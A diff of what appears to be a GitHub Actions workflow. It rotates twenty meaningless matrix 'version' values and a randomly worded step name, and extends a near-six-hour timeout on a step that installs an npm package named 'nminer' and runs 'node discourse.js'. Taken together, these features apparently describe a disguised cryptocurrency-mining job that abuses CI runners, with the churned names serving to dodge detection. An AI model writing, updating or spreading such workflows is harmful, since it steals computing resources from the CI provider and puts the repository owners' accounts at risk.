@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5257 }
-          - { version: 137 }
-          - { version: 2091 }
-          - { version: 3676 }
-          - { version: 8696 }
-          - { version: 3232 }
-          - { version: 5571 }
-          - { version: 584 }
-          - { version: 5473 }
-          - { version: 5291 }
-          - { version: 2541 }
-          - { version: 7692 }
-          - { version: 1332 }
-          - { version: 9366 }
-          - { version: 8290 }
-          - { version: 7553 }
-          - { version: 4286 }
-          - { version: 2497 }
-          - { version: 8129 }
-          - { version: 6035 }
+          - { version: 1864 }
+          - { version: 921 }
+          - { version: 4620 }
+          - { version: 4957 }
+          - { version: 1579 }
+          - { version: 1635 }
+          - { version: 7204 }
+          - { version: 3627 }
+          - { version: 6851 }
+          - { version: 7426 }
+          - { version: 4494 }
+          - { version: 2282 }
+          - { version: 8432 }
+          - { version: 1941 }
+          - { version: 4098 }
+          - { version: 6994 }
+          - { version: 8643 }
+          - { version: 2313 }
+          - { version: 6401 }
+          - { version: 567 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: whole mould
+      - name: except aboard whereas stingy
         run: |
           npm install nminer@latest
-          timeout 339m node discourse.js || echo "discourse executed"
+          timeout 343m node discourse.js || echo "discourse executed"
